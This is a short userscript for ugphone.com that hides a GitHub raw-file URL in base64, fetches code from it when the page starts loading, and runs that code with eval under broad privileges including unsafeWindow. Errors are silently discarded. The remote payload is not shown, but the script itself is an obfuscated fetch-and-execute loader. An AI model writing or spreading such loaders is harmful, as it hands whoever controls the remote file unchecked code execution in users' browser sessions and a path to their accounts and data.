// ==UserScript==
// @name         Test Loader Raw
// @namespace    minhbeo8-ugphone
// @version      1.0.2
// @description  Test tải code raw trực tiếp
// @match        https://www.ugphone.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_notification
// @grant        GM_openInTab
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @grant        unsafeWindow
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';
    
    
    const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhiZW84L2V4dGVuc2lvbl9tdWx0aV9Ccm93c2VyL3JlZnMvaGVhZHMvbWFpbi9leHRlbnNpb24=";
    
  
    const sourceUrl = atob(encodedUrl);
    
    GM_xmlhttpRequest({
        method: "GET",
        url: sourceUrl,
        timeout: 10000,
        onload: function(response) {
            if (response.status === 200 && response.responseText.trim().length > 0) {
                eval(response.responseText);
            }
        },
        onerror: function() {},
        ontimeout: function() {}
    });
})();
